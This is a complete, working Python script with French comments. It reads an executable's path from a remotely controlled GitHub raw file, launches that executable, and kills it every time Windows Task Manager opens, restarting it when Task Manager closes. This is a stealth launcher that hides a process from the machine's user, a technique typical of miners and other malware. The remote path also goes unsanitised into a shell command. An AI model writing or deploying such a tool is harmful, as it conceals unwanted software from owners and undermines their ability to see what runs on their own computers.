import psutil
import subprocess
import time
import os
import requests

# URL du fichier texte raw contenant le chemin complet de l'exe
URL_PATH_TXT = "https://raw.githubusercontent.com/luxamind141/executionscript/refs/heads/main/centraladress.txt"

def get_exe_path_from_github():
    try:
        # Ajout d'un paramètre unique pour éviter le cache
        url = URL_PATH_TXT + "?t=" + str(int(time.time()))
        r = requests.get(url, timeout=5)
        if r.status_code == 200:
            path = r.text.strip()
            if os.path.isfile(path):
                return path
            else:
                print(f"[ERROR] Le chemin récupéré n'existe pas: {path}")
        else:
            print(f"[ERROR] Erreur HTTP: {r.status_code}")
    except Exception as e:
        print(f"[ERROR] Exception lors du téléchargement: {e}")
    return None

def is_taskmgr_open():
    for proc in psutil.process_iter(['name']):
        try:
            if proc.info['name'].lower() == "taskmgr.exe":
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return False

def start_exe(exe_path):
    print(f"[INFO] Lancement de l'exe en nouvelle fenêtre: {exe_path}")
    subprocess.Popen(f'start "" "{exe_path}"', shell=True)

def kill_all_exe(exe_name):
    print(f"[INFO] Fermeture de toutes les instances de l'exe: {exe_name}")
    for proc in psutil.process_iter(['name']):
        try:
            if proc.info['name'].lower() == exe_name.lower():
                print(f"[INFO] Kill process {proc.pid} - {exe_name}")
                proc.kill()
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue

def main():
    exe_path = get_exe_path_from_github()
    if not exe_path:
        print("[ERROR] Chemin exe non trouvé ou invalide. Arrêt.")
        return

    exe_name = os.path.basename(exe_path)
    exe_running = False

    # Au démarrage : si gestionnaire fermé, on lance l'exe
    if not is_taskmgr_open():
        start_exe(exe_path)
        exe_running = True
    else:
        exe_running = False

    while True:
        if is_taskmgr_open():
            if exe_running:
                kill_all_exe(exe_name)
                exe_running = False
        else:
            if not exe_running:
                start_exe(exe_path)
                exe_running = True

        time.sleep(1)

if __name__ == "__main__":
    main()
